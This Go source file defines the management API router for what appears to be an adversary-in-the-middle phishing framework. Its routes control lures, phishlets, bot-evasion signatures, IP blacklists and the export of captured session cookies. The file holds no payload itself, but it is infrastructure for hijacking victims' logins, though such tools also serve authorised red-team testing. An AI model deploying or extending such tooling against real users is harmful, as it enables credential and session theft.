package api

import (
	"log/slog"
	"net/http"
	"sync"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

type sessionManager interface {
	Get(id string) (*aitm.Session, error)
	List(filter aitm.SessionFilter) ([]*aitm.Session, error)
	Count(filter aitm.SessionFilter) (int, error)
	Delete(id string) error
	ExportCookiesJSON(id string) ([]byte, error)
}

type lureManager interface {
	Get(id string) (*aitm.Lure, error)
	Create(lure *aitm.Lure) error
	Update(lure *aitm.Lure) error
	Delete(id string) error
	List() ([]*aitm.Lure, error)
	Pause(id string, d time.Duration) (*aitm.Lure, error)
	Unpause(id string) (*aitm.Lure, error)
}

type phishletManager interface {
	Enable(name, hostname, dnsProvider string) (*aitm.Phishlet, error)
	Disable(name string) (*aitm.Phishlet, error)
	Hide(name string) (*aitm.Phishlet, error)
	Unhide(name string) (*aitm.Phishlet, error)
	Get(name string) (*aitm.Phishlet, error)
	List() ([]*aitm.Phishlet, error)
}

type blacklistManager interface {
	Block(ip string)
	Unblock(ip string)
	List() []string
}

type botguardManager interface {
	ListSignatures() ([]aitm.BotSignature, error)
	AddSignature(sig aitm.BotSignature) error
	RemoveSignature(ja4Hash string) (bool, error)
}

type eventBus interface {
	Subscribe(eventType aitm.EventType) <-chan aitm.Event
	Unsubscribe(eventType aitm.EventType, ch <-chan aitm.Event)
}

// Router is the top-level handler for the management API. It implements
// http.Handler and is passed to the APIRouter pipeline step.
type Router struct {
	Sessions  sessionManager
	Lures     lureManager
	Phishlets phishletManager
	Blacklist blacklistManager
	Botguard  botguardManager
	Bus       eventBus
	HTTPSPort int // Included in lure URLs when non-standard (not 443)
	Version   string
	Logger    *slog.Logger

	once      sync.Once
	mux       *http.ServeMux
	startedAt time.Time
}

func (r *Router) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	r.once.Do(func() {
		r.mux = http.NewServeMux()
		r.startedAt = time.Now()
		r.registerRoutes()
	})

	r.mux.ServeHTTP(w, req)
}

func (r *Router) registerRoutes() {
	h := func(method, route string, handler http.HandlerFunc) {
		r.mux.HandleFunc(method+" "+route, r.authMiddleware(r.auditMiddleware(handler)))
	}

	// Sessions
	h("GET", sdk.RouteSessionsStream, r.streamSessions)
	h("GET", sdk.RouteSessionExport, r.exportSessionCookies)
	h("GET", sdk.RouteSession, r.getSession)
	h("DELETE", sdk.RouteSession, r.deleteSession)
	h("GET", sdk.RouteSessions, r.listSessions)

	// Lures
	h("GET", sdk.RouteLures, r.listLures)
	h("POST", sdk.RouteLures, r.createLure)
	h("PATCH", sdk.RouteLure, r.updateLure)
	h("DELETE", sdk.RouteLure, r.deleteLure)
	h("POST", sdk.RouteLureURL, r.generateLureURL)
	h("POST", sdk.RouteLurePause, r.pauseLure)
	h("DELETE", sdk.RouteLurePause, r.unpauseLure)

	// Phishlets
	h("GET", sdk.RoutePhishletHosts, r.getPhishletHosts)
	h("POST", sdk.RoutePhishletEnable, r.enablePhishlet)
	h("POST", sdk.RoutePhishletDisable, r.disablePhishlet)
	h("POST", sdk.RoutePhishletHide, r.hidePhishlet)
	h("POST", sdk.RoutePhishletUnhide, r.unhidePhishlet)
	h("GET", sdk.RoutePhishlet, r.getPhishlet)
	h("GET", sdk.RoutePhishlets, r.listPhishlets)

	// Blacklist
	h("GET", sdk.RouteBlacklist, r.listBlacklist)
	h("POST", sdk.RouteBlacklist, r.addBlacklistEntry)
	h("DELETE", sdk.RouteBlacklistEntry, r.removeBlacklistEntry)

	// DNS
	h("GET", sdk.RouteDNSZones, r.listDNSZones)
	h("POST", sdk.RouteDNSSync, r.syncDNS)

	// BotGuard
	h("GET", sdk.RouteBotSignatures, r.listBotSignatures)
	h("POST", sdk.RouteBotSignatures, r.addBotSignature)
	h("DELETE", sdk.RouteBotSignature, r.removeBotSignature)
	h("PATCH", sdk.RouteBotThreshold, r.updateBotThreshold)

	// System
	h("GET", sdk.RouteStatus, r.getStatus)
	h("POST", sdk.RouteReload, r.reload)

	// Campaigns
	h("GET", sdk.RouteCampaigns, r.listCampaignMappings)
	h("POST", sdk.RouteCampaignSync, r.syncCampaign)
}
